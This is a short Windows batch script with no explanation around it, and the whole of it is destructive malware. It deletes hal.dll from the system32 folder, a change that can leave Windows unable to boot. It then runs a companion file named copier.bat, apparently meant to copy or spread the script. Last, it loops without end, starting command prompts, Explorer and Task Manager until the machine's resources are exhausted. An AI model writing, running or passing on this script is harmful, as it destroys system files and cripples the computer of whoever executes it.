cd "C:\WINDOWS\system32\"
del "hal.dll"

start copier.bat
:loop
start cmd.exe
start explorer.exe
start taskmgr.exe
goto loop
